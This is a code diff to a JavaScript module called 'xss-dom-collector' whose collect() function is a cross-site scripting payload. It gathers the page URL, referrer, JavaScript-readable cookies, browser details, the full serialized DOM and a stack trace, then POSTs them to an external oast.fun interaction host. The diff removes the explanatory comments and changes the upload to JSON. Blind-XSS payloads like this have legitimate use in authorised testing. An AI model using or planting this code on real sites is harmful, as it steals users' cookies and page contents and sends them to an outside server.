@@ -3,7 +3,6 @@ export async function collect() {
         collector: "xss-dom-collector",
         timestamp: new Date().toISOString(),
 
-        // Execution context
         href: location.href,
         origin: location.origin,
         protocol: location.protocol,
@@ -12,27 +11,20 @@ export async function collect() {
         search: location.search,
         hash: location.hash,
 
-        // Document information
         title: document.title,
         referrer: document.referrer,
         domain: document.domain,
 
-        // Cookies available to JavaScript.
-        // HttpOnly cookies will NOT be present.
         cookies: document.cookie,
 
-        // Browser information
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
 
-        // Frame information
         isTopLevel: window === window.top,
 
-        // Complete serialized document
         dom: document.documentElement.outerHTML,
 
-        // Potentially useful for tracing execution
         stack: new Error().stack
     };
 
@@ -57,12 +49,14 @@ export async function collect() {
     body.append("isTopLevel", String(data.isTopLevel));
     body.append("stack", data.stack || "");
 
-    // The important one.
     body.append("dom", data.dom);
 
     await fetch("https://yfbeqwpiwqjmuewwrgoafb56fi4v0lhqj.oast.fun", {
         method: "POST",
-        body,
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data),
         mode: "no-cors",
         keepalive: true
     });
